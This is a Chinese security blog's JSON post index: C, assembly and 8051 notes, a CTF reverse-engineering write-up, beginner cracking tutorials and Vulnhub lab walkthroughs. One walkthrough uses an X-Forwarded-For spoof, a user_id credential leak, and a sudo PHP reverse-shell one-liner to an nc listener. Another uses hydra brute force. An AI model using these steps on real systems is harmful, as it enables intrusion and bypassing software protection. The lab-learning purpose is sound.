{"pages":[{"title":"About","date":"2020-05-20T11:45:55.229Z","path":"about/index.html","text":""},{"title":"Categories","date":"2020-05-20T11:45:55.229Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-05-20T11:45:55.229Z","path":"tags/index.html","text":""}],"posts":[{"title":"【Vulnhub】Sunset:nightfall--Workthourgh","date":"2020-05-31T08:36:15.000Z","path":"wiki/靶机笔记/vulnhub/6-nightfall/","text":"【Vulnhub】Sunset:nightfall–Workthourgh 文章作者：kn0sky 作者博客：kn0sky.com 靶机信息用到的工具/知识 渗透过程 攻击机IP：192.168.101.5 靶机IP：192.168.101.6 端口扫描： 目标开放了21/22/80/139/445/3306端口 这几个端口可能存在的问题：【找图片/表格】 80端口是Apache默认页面，目录扫描之后除了Apache还有一个403进不去 见到samba就枚举用户名： 1enum4linux 192.168.101.6 得到用户名：matt和nightfall 使用hydra去爆破ftp账号弱口令： 得到matt的密码为cheese 登录ftp看看： 参考资料","tags":[],"categories":[{"name":"靶机笔记","slug":"靶机笔记","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"},{"name":"vulnhub","slug":"靶机笔记/vulnhub","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"}]},{"title":"open-source Write Up","date":"2020-05-29T12:40:50.000Z","path":"wiki/XCTF攻防世界WP/新手练习区/REVERSE/re001-open-source/","text":"open-source Write Up难度：☆☆☆ 这道题提供了一个c语言源代码： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; if (argc != 4) &#123; printf(\"what?\\n\"); exit(1); &#125; unsigned int first = atoi(argv[1]); if (first != 0xcafe) &#123; printf(\"you are wrong, sorry.\\n\"); exit(2); &#125; unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) &#123; printf(\"ha, you won't get it!\\n\"); exit(3); &#125; if (strcmp(\"h4cky0u\", argv[3])) &#123; printf(\"so close, dude!\\n\"); exit(4); &#125; printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0;&#125; 很显然我们需要让这段代码跑起来并且跑到最后让程序自己算出来flag， 所以我们我们需要把main函数需要的参数值删掉并且放到main函数内去定义,修改如下： 123int main() &#123; int argc &#x3D; 4; char * argv[] &#x3D; &#123;&quot;1&quot;,&quot;51966&quot;,&quot;25&quot;,&quot;h4cky0u&quot;&#125;; 这里的atoi()函数的功能是从前往后取字符串整数部分，所以我们把argv[1]所需要的整数的十六进制转换成十进制0xcafe，即51996，即可 然后点击调试，程序即可顺利运行到最后","tags":[],"categories":[{"name":"XCTF攻防世界WP","slug":"XCTF攻防世界WP","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/"},{"name":"新手练习区","slug":"XCTF攻防世界WP/新手练习区","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"},{"name":"REVERSE","slug":"XCTF攻防世界WP/新手练习区/REVERSE","permalink":"http://kn0sky.com/categories/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/"}]},{"title":"C语言基础09--C预处理器和C库","date":"2020-05-28T08:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础09--C预处理器和C库/","text":"C语言基础09–C预处理器和C库预处理器预处理器是#号开头的，比如宏：#define 宏的基本用法 123456#include&lt;stdio.h&gt;#define Five 5int main()&#123; printf(\"%d\",Five);//在编译过程中，Five会被直接替换成5 return 0;&#125; 带参数的宏 123456#include&lt;stdio.h&gt;#define Five(X) X*Xint main()&#123; printf(\"%d\",Five(5));//在编译过程中，替换成一段表达式 return 0;&#125; 123456#include&lt;stdio.h&gt;#define Five(X) printf(\"This is %d\",X)int main()&#123; Five(5);//在编译过程中，替换成一段表达式,打印字符串出来 return 0;&#125; 条件的预处理器//#indef #else #endif 1234567891011121314//#indef #else #endif#include&lt;stdio.h&gt;#define Five 5#undef Fiveint main() &#123; //通过define来判断执行什么语句#ifdef Five printf(\"yes\");#else printf(\"no\");#endif return 0;&#125; 条件的预处理器 #if #elif #endif 1234567891011121314#include&lt;stdio.h&gt;#define Five 4//#undef Fiveint main() &#123;#if Five ==5 printf(\"yes\");#elif Five ==4 printf(\"no\");#endif return 0;&#125; 可以用于不同版本系统的编译 头文件代码开头的#include&lt;stdio.h&gt;是将该库中的所有代码复制进代码中，可以直接调用","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP代码调试环境搭建","date":"2020-05-28T06:40:50.000Z","path":"wiki/审计笔记/PHP代码调试环境搭建/","text":"PHP 代码调试环境搭建前言本文以记录个人进行人工代码审计学习所使用到的PHP相关的环境的搭建，后面打算开始更新代码审计学习相关文章，有兴趣的老哥可以来关注一下~ 本文将简要介绍PHP运行环境的搭建（包括Windows和Linux） 以及主要介绍一下PHP断点调试环境的搭建 PHP 运行环境的搭建现在有一键搭建php运行环境的工具在，所以这里搭建操作很简单，此处简单记录搭建过程 Windows系统下Windows环境我使用的是Windows7版本的虚拟机，创建好虚拟机之后去PHPStudy官网下载Windows安装包，拖到Windows虚拟机里，然后直接安装即可，非常无脑 Linux系统下Linux环境我使用的是Ubuntu 20.04 LTS版本的虚拟机，创建好虚拟机之后去PHPStudy官网寻找Ubuntu的安装脚本,这里我找好了，如下，直接复制进装好的Ubuntu虚拟机里执行即可，也很无脑 1wget -O install.sh https://download.xp.cn/install.sh &amp;&amp; sudo bash install.sh 安装完会出现如下字样 至于如何使用，可以在官网上的文档找到详细说明 PHP 断点调试环境的搭建Windows系统下服务器端配置打开windows7虚拟机，打开PHPStudy，开启WANP，创建站点，然后点击管理，php扩展，添加php_xdebug 也可以通过xdebug官网下载：http://xdebug.org/docs/install 通过左侧菜单栏找到设置，选择配置文件，编辑php.ini，在php.ini最底下添加如下内容： 12345678910[Xdebug]zend_extension=\"C:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\ext\\php_xdebug.dll\" xdebug.remote_enable=1#与remote_connect_back不能同时开启xdebug.remote_port=9000xdebug.remote_host=\"192.168.2.112\" #与remote_host不能同时开启;xdebug.remote_connect_back = 1 xdebug.remote_handler=\"dbgp\"xdebug.idekey=PHPSTORM zend_extension每个人安装xdebug扩展的位置可能不同，按实际情况填写。 可通过左侧菜单栏找到设置，选择文件位置，点击php，找到扩展的位置 remote_enable 必须设置为1 remote_host和remote_port分别填localhost和9001。remote是指IDE端，并非浏览器端或者PHP服务端，注意理解清楚。 remote_handler只能填dbpg，照填就行。 idekey是用于进行会话身份标识的，需要与后面IDE端填的保持一致，这里填的是PHPSTORM。 IDE端配置太麻烦了，以后再补上吧 参考资料https://www.jianshu.com/p/53a9064cb4e7","tags":[],"categories":[{"name":"审计笔记","slug":"审计笔记","permalink":"http://kn0sky.com/categories/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础08--结构体","date":"2020-05-28T04:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础08--结构体/","text":"C语言基础08–结构体&amp;联合体&amp;枚举类型结构体的声明：123456789101112131415#include&lt;stdio.h&gt;int main() &#123; struct NPC &#123; char * Name; int HP; int MP; &#125;; struct NPC xiaoer; xiaoer.Name = \"xiaoer\"; xiaoer.HP = 100; xiaoer.MP = 200; return 0;&#125; 结构体指针1234567891011121314151617#include&lt;stdio.h&gt;int main() &#123; struct NPC &#123; char * Name; int HP; int MP; &#125;; struct NPC npcarr[100]; struct NPC *npcindex;//声明一个结构体指针 npcindex = &amp;npcarr[0]; npcindex-&gt;Name = \"xiao1\";//通过指针可以修改内容 npcindex++;//指针每次移动一个结构体的量 npcindex-&gt;Name = \"xiao222\"; return 0;&#125; 结构体参数在函数中的应用：作为参数 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;struct NPC&#123; char * Name; int HP; int MP;&#125;;int outputNPC(struct NPC a) &#123; printf(\"%s\\nHP=%d\\nMP=%d\", a.Name, a.HP, a.MP); return 0;&#125;int initNPC(char * name, int HP, int MP) &#123; struct NPC npc1; npc1.Name = name; npc1.HP = HP; npc1.MP = MP; outputNPC(npc1); return 0;&#125;int main() &#123; initNPC(\"lihua\", 10, 1000); return 0;&#125; 联合体12345678910111213141516#include \"main.h\"union Info &#123; int HP; char PlayerName;&#125;;int main() &#123; union Info Myinfo; Myinfo.PlayerName = 'a'; //联合体所有成员地址都是一样的 Myinfo.HP = 1111; //多个值初始化之后只显示最后一个值，也就是同时只能使用其中一个成员 printf(\"%c\\n%d\\n\", Myinfo.PlayerName, Myinfo.HP); return 0;&#125; 枚举类型1234567891011121314#include \"main.h\"int main() &#123; enum color &#123;red,green,blue&#125;;//实际是个整数类型 int flag = 0; scanf(\"%d\", &amp;flag); switch (flag) &#123; case red:printf(\"red\"); break; case green:printf(\"freen\"); break; case blue:printf(\"blue\"); break; &#125; //用来看的更清晰 return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础07--文件操作","date":"2020-05-28T03:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础07--文件操作/","text":"C语言基础07–文件操作fopen模式 读取文件： 声明一个文件指针 通过fopen打开文件获得文件指针 判断文件指针是否为空，为空则打开失败 把文件指针放到文件末尾来获取文件大小 指针再移动会文件头部 申请一块缓冲区空间用来存储读取的数据 对空间初始化 通过fread获取文件内容和真实大小 通过真实大小和刚刚获取的大小进行比较，如果相同则读取成功 读取完毕，通过fclose关掉文件指针 写文件： 声明一个文件指针 通过fopen打开文件获得文件指针 通过fwrite来写入文件，返回1则写入成功 关闭文件指针 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //通过移动位于文件头部的指针，可以读取文件任意位置的数据，文件指针移动到末尾处，文件读取完毕 //声明文件指针，FILE类型 FILE * pFile; //申请一个内存空间存储文件内容，也就是char * 类型字符串 char * szReadTextBuffer; //申请一个变量存储文件尺寸 int nReadFileSize; //获取读取到的文件缓冲区字节数,使用fread会返回真实长度，用来判断读取是否成功 int nReadRetSize; //fopen 可以用于打开文件，两个参数：文件路径和读取模式 if ((pFile = fopen(\"E:\\\\123.txt\", \"rb\")) == NULL) &#123; //读取失败返回NULL printf(\"文件打开失败\"); exit(0); &#125; //通过设置文件指针到文件末尾，可以算出文件大小 //设置文件指针到末尾 fseek(pFile, 0, SEEK_END);//fseek用来设置指针位置（文件指针，0，要移动的位置）SEEK_END表示文件末尾（设定好的宏） //获取文件指针的位置,获取文件大小 nReadFileSize = ftell(pFile); //文件指针复位 rewind(pFile);//用来恢复到初始位置 //根据文件尺寸声明足够大小的内存空间 szReadTextBuffer = (char *)malloc(sizeof(char)*nReadFileSize + 1); //判断一下是否申请成功 if (szReadTextBuffer == NULL) &#123; printf(\"failed\"); exit(0); &#125; //对申请到的空间初始化 memset(szReadTextBuffer, 0, nReadFileSize + 1); //将依据获取到文件指针的文件内容读取到已经申请好的缓冲区中，并返回真实读取到的长度 nReadRetSize = fread(szReadTextBuffer, 1, nReadFileSize, pFile); //判断是否读取失败 if (nReadFileSize != nReadRetSize) &#123; printf(\"failed\"); exit(0); &#125; printf(\"%s\", szReadTextBuffer); fclose(pFile); FILE * pFile0; pFile0 = fopen(\"E:\\\\1234.txt\", \"wb\"); //fwrite作用把字符串写入文件中，第一个是缓冲区指针，第二个是写出单个元素的大小，第三个元素个数，第四个是文件指针 int s = fwrite(szReadTextBuffer, strlen(szReadTextBuffer), 1, pFile0); fclose(pFile0); return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础06--存储类&内存管理","date":"2020-05-28T02:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础06--存储类&内存管理/","text":"C语言基础06–存储类&amp;内存管理存储类C语言有6种存储类，可以按照作用域，链接，存储时期来描述 存储时期分为两种 静态存储时期：类似于局部变量 自动存储时期：类似于全局变量 存储类除了指针存储类还有5种： 自动存储类 auto ：生命周期在花括号内 寄存器存储类 register 具有外部链接的静态存储类 extern：生命周期是在整个程序内 具有外部链接的静态存储类 static：生命周期是在文件内 空链接的静态存储类 static 内存管理12345678#include&lt;stdlib.h&gt;int main() &#123; char * szstr; //没初始化，所以没分配内存 szstr = (char *)malloc(20 * sizeof(char));//使用malloc分配内存，50个char类型的大小 memset(szstr, 0, 50 * sizeof(char)); //初始化为0 free(szstr); //释放内存 return 0;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"C语言学习笔记","slug":"学习笔记/C语言学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础13--间接寻址","date":"2020-05-26T02:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础13--间接寻址/","text":"汇编基础13–间接寻址可以把寄存器当做指针来进行寻址操作 12345678910111213141516.data arrnum word 1,2,3,4,5,6,7.codemain proc xor eax ,eax xor ebx ,ebx mov eax ,offset arrnum mov bl ,[eax] add eax ,2 mov bl ,[eax] add eax ,2 mov bl ,[eax] add eax ,2 invoke ExitProcess,0main endpEND main 也可以这样 12345678910111213.data arrnum word 1,2,3,4,5,6,7.codemain proc xor eax ,eax xor ebx ,ebx mov eax ,offset arrnum mov bl ,[eax] mov bl ,[eax+2] mov bl ,[eax+4] invoke ExitProcess,0main endpEND main 比例因子利用数组下标进行寻址 123456789.data arrnum dword 1,2,3,4,5,6,7.codemain proc mov esi ,4 mov eax ,arrnum[esi * 4] invoke ExitProcess,0main endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"51单片机入门04--定时&计数器","date":"2020-05-20T12:57:19.000Z","path":"wiki/学习笔记/51单片机学习笔记/51单片机入门04--定时&计数器/","text":"51单片机入门04–定时&amp;计数器原理 常用的工作方式是1（16位）和2（8位自动重置，用于串口通信产生波特率） 一般用的是工作方式1 GATE一般给0，如果通过外部中断来启用定时计数器，可以给1 工作方式 单片机定时器单位是us，1ms=1000us 11.0592MHz用于通讯 例：使用定时器显示数字，每秒一变 123456789101112131415161718192021222324252627282930313233343536#include \"reg51.h\"unsigned char num[] = &#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;int n = 0;int count = 0;void inittimer()&#123; TMOD = 0x01; //0000 0001 TH0 = (65536-50000)/256;//16位定时初值高8位 TL0 = (65536-50000)%256; ET0 = 1;//开启定时器0中断 EA = 1; //开启总中断 TR0 = 1; //开启定时器0&#125;void display()&#123; P2 = num[n]; if(n == 10)&#123; n = 0; &#125;&#125;void main()&#123; inittimer(); while(1)&#123; display(); &#125;&#125;void timer_isr() interrupt 1&#123; TH0 = (65536-50000)/256; //50us TL0 = (65536-50000)%256; count++; if(count==20)&#123; n++; count=0; &#125;&#125; 示例：计数器 12345678910111213141516171819202122232425262728#include \"reg51.h\"unsigned char num[] = &#123;0x3f,0x06,0x5b,0x4f,0x66,0x6d,0x7d,0x07,0x7f,0x6f&#125;;int n=0;void initcounter()&#123; TMOD = 0x06; TH0 = 256 - 1; TL0 = TH0; ET0 =1; EA =1; TR0 =1;&#125;void display()&#123; P2 = num[n]; if(n == 10)n=0;&#125;void main()&#123; initcounter(); while(1)&#123; display(); &#125;&#125;void counter_isr() interrupt 1&#123; n++;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"【Vulnhub】Me And My Girlfriend--Workthourgh","date":"2020-05-20T08:06:19.000Z","path":"wiki/靶机笔记/vulnhub/5-MeAndMyGirlfriend/","text":"【Vulnhub】Me And My Girlfriend:1–Workthourgh 文章作者：kn0sky 作者博客：kn0sky.com 本来想下载新的靶机去玩的，无奈下载速度太慢，无意间发现去年下载的没打过的靶机，是个简单难度的，刚好挺久没练习了，有点生疏了拿来练练手，耗时：2小时 靶机信息1234567891011Date release: 13 Dec 2019Author: TW1C3Series: Me and My GirlfriendDescription: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!Difficulty Level: BeginnerNotes: there are 2 flag filesLearning: Web Application | Simple Privilege Escalation 靶机下载地址：https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/ 用到的知识&amp;工具 nmap&amp;主机发现、端口扫描 burp&amp;修改请求包信息 sudo -l查看权限 php反弹shell 渗透过程攻击机的IP地址为192.168.101.5 靶机的IP地址为192.168.101.4 先端口扫描 目标开放了22端口和80端口 查看80端口 看起来像个提示，等会再说，先进行目录爆破看看，得到几个可以访问的地址 在robots.txt文件里找到如下内容： 12User-Agent: *Allow: &#x2F;heyhoo.txt 访问这个地址： 看起来又是个提示 这个网站主页上说，网站只能从内部访问，这里猜测服务器通过IP地址来判断访问者来源，那么我们在访问请求中添加XFF头来试一试：X-Forwarded-For:127.0.0.1 网站成功跳转了（这里注意，每次发送请求都需要把XFF头加上）,成功进入网站主页： 浏览一番发现，网站存在用户名密码泄露的问题，这里我们通过注册功能注册一个账号，然后登录进入，进入profile页面如下： 在这个页面刷新，用Burp抓包，把抓到的包放到repeater模块中 可以轻易发现，我们的账号密码在网页中是以明文保存的，这个时候我们修改请求中的user_id参数，可以发现，不同的user_id的值代表不同的用户信息（账号&amp;密码） 通过不断修改user_id的值我们可以得到如下用户名和密码： 12345eweuhtandingan:skuyatuhaingmaung:qwerty!!!sundatea:indONEsiasedihaingmah:cedihhihihialice:4lic3 拿到了目标Alice的账号密码，ssh登录服务器看看： 登陆成功，且在alice的主目录下找到了flag1 以及emmmm，alice不喜欢bob了？？？算了，管他呢 12alice@gfriEND:~/.my_secret$ cat my_notes.txt Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes 下一步是拿到root权限，先查看一下Alice账号的权限吧： 123456alice@gfriEND:~/.my_secret$ sudo -lMatching Defaults entries for alice on gfriEND: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on gfriEND: (root) NOPASSWD: /usr/bin/php alice可以免密码使用root权限执行php命令，这就好办了，思路是通过root权限执行php反弹shell到攻击机上 先在攻击机上运行nc来监听 12root@windows7:~# nc -nvlp 7788listening on [any] 7788 ... 然后使用alice 的账号运行php反弹shell 1alice@gfriEND:~/.my_secret$ sudo php -r '$sock=fsockopen(\"192.168.101.5\",7788);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 这个时候我们拿到了反弹的shell: 12345root@windows7:~# nc -nvlp 7788listening on [any] 7788 ...connect to [192.168.101.5] from (UNKNOWN) [192.168.101.4] 43264# whoamiroot 既然已经提权到root了，直接去root目录找flag 到此正式结束","tags":[],"categories":[{"name":"靶机笔记","slug":"靶机笔记","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/"},{"name":"vulnhub","slug":"靶机笔记/vulnhub","permalink":"http://kn0sky.com/categories/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/"}]},{"title":"逆向基础02--初试破解","date":"2020-05-16T17:40:50.000Z","path":"wiki/学习笔记/逆向入门学习笔记/逆向基础02--初试破解/","text":"逆向基础02–初试破解三个例子初试破解学习记录（样本均来自知识星球课件） 例一：控制台破解例子目标是：登录成功！ 0x01 先找到程序入口通过查找参考文本字符串可以轻松找到入口位置： 0x02 分析程序通过阅读反汇编代码，我们可知程序会首先让我们输入一次密码，然后把输入的密码一位一位和正确答案比对正确一位，如果全都相同也就是eax大于5，则登录成功 思路： 直接跳转到登录成功的地方 修改eax大于5 修改待比对的数值，然后输入修改过的密码 通过待比对的数值计算出密码 0x03 破解程序直接按照思路1走最简单 完成 例二：MFC破解例子重点在于学会查找字符串 这是图形界面的程序","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逆向入门学习笔记","slug":"学习笔记/逆向入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"逆向基础01--初见逆向","date":"2020-05-16T13:40:50.000Z","path":"wiki/学习笔记/逆向入门学习笔记/逆向基础01--初见逆向/","text":"逆向基础01–初见逆向在使用VS2015生成解决方案的时候，有两个版本： 分别是Debug和Release版 Debug版比较大，带调试信息 Release版更小，会对代码进行优化精简 寻找主程序在逆向的时候，第一件事是先找到主程序 示例程序： 12345#include&lt;stdio.h&gt;int main() &#123; printf(\"hello world!\"); return 0;&#125; 这里有个字符串hello world!在运行的时候回打印出来，所以可以作为标志点去寻找 对于debug版本：（使用Ollydbg） ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进去 对于Release版本： ollydbg拖入程序后，右键，查找，所有参考文本字符串，然后点进入 F8跳转，见到红的F7进去，直到3个push1个call，很有可能是main函数（main函数特点：3个参数）F7进去看 也可以直接往上拖，一般release版本main函数在最上面附近 如果有API查找所有模块调用 也可以用ida，ida会自动分析出main函数 内存中数据的修改比如将前面的代码输出的hello world改为其他内容 直接修改1： 找到需要修改的地方，F2加断点，F9执行过去 在内存窗口上右键，转到，输入地址 ollydbg在地址上，左键拖动选中，右键，二进制，编辑修改 不保持大小可能会淹掉后面的数据 直接修改2： 在内存空的地方，修改入其他的值 找到需要修改的地方的push，把push后面的地址改为刚才修改过的地址 修改的作用：跳过程序中某些过程 修改跳转示例代码： 12345678910111213#include&lt;stdio.h&gt;int main() &#123; int nNum = 0; scanf(\"%d\", &amp;nNum); if (nNum == 87998623) &#123; printf(\"success!\"); &#125; else &#123; printf(\"failed!\"); &#125; system(\"pause\"); return 0;&#125; 目的是输出success 先在ollydbg里找到main函数 找到关键跳转，双击，汇编，改成我们要去的地址 然后我随便输入个啥，都能输出success啦 把对比对象的值改掉也行，方法不唯一 滑板指令使用nop（没有作用的指令）把跳转改掉 还是刚才那个程序，修改结果如下： 执行完，打印出success！这里就不放图了","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逆向入门学习笔记","slug":"学习笔记/逆向入门学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"C语言基础05--字符串操作","date":"2020-05-16T07:40:50.000Z","path":"wiki/学习笔记/C语言学习笔记/C语言基础05--字符串操作/","text":"C语言基础05–字符串操作字符串的声明1234567891011121314#include&lt;stdio.h&gt;int main() &#123; //字符串的声明可以用3钟方法 //在c/c++里，字符串以00结尾，第一种方式声明会自动在字符串末尾加00 char str[] = &#123; \"hello\" &#125;; //第二种方式声明需要手动添加\\0 char str1[] = &#123; 'h','e','l','l','o','\\0' &#125;; //第三种方式声明和声明数组是一样的 char * str2 = \"hello\"; printf(\"%s,%s,%s\", str, str1, str2); return 0;&#125; 字符串的输入3种方法从控制台接收字符串 12345678910111213141516#include&lt;stdio.h&gt;int main() &#123; //三种从控制台获取输入的途径：gets/fgets/scanf char str[50]; //gets 默认以回车的方式结束输入 //gets(str); //fgets接收3个参数，存放字符串的位置，接收字符串的长度，接收模式 与gets的区别在于会接收回车，能控制接收大小 //fgets(str,50,stdin); //scanf通过格式化输入来控制输入长度 scanf(\"%5s\", &amp;str); printf(\"%s\", str); return 0;&#125; 字符串的输出123456789#include&lt;stdio.h&gt;int main() &#123; char str[] = &#123;\"hello\\n\"&#125;; //两种方式：puts printf puts(str);//自带换行 printf(\"%d\", str); return 0;&#125; 计算字符串长度12345678910#include&lt;stdio.h&gt;#include&lt;string.h&gt; //字符串操作一般都包含进去，会用得上int main() &#123; //字符串以00或者\\0结尾，真实长度比输出来的长度要多1 char str[] = &#123;\"hello\"&#125;; int a = strlen(str); printf(\"a=%d\", a); return 0;&#125; 字符串拼接123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //字符串拼接的两个函数：strcat,strncat //strcat接收两个参数：目的字符串，源字符串，将源字符串拷贝到目的字符串后面，存到目的字符串里 //strncat接收三个参数：目的字符串，源字符串，接收长度，将指定长度的源字符串拷贝到目的字符串后面，存到目的字符串里 char str1[] = \"hello \"; char str2[] = \"world \\n\"; //strcat(str1, str2); //printf(\"%s\", str1); strncat(str1, str2,2); printf(\"%s\", str1); return 0;&#125; 字符串对比12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //strcmp strcnmp //strcmp接收两个参数：待比较的两个字符串，返回0表示相等，返回其他值表示不相等 //strncmp接收三个参数，待比较的两个字符串和比对的字符数（从头往后数）,返回值同上 char str1[] = \"hello\"; char str2[] = \"hello world\"; int res = 0; //res = strcmp(str1, str2); //-1 res = strncmp(str1, str2, 5); //0 printf(\"%d\", res); return 0;&#125; 字符串拷贝12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //strcpy strncpy //strcpy接收两个参数：目的字符串和源字符串，将源字符串的东西拷贝到目的字符串里 //strncpy比上面多接收一个参数，拷贝的字符数 char str1[30] = &#123; 0 &#125;;//这里需要用0初始化，因为字符串找到0才结尾，打印的时候会出现烫烫烫烫烫烫 char str2[] = \"hello world\"; //strcpy(str1, str2); strncpy(str1, str2,5); printf(\"%s\", str1); return 0;&#125; 字符串格式化1234567891011121314151617#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; //sprintf：将printf格式化输出的结果保存到字符串里 //接收三个参数，一个是目标字符串，2是格式化格式，3是格式化内容 char str[] = &#123;\"hello\"&#125;; int n = 10; printf(\"%s,%d\\n\", str, n); char str0[20] = &#123; 0 &#125;; sprintf(str0, \"%s,%d\\n\", str, n); printf(\"%s\",str0); return 0;&#125;//两个输出是一样的 动态内存管理三步骤： 申请内存 malloc,memset 使用内存 释放内存 free 123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt; int main() &#123; char * str; //malloc在堆上面申请内存，返回的是void * str = (char *)malloc(200 * sizeof(char)); //memset,把一段内存地址刷成你想要的的值 memset(str, 0, 200 * sizeof(char)); strcpy(str, \"asdjaljfalkjas\"); //free 释放内存 free(str); return 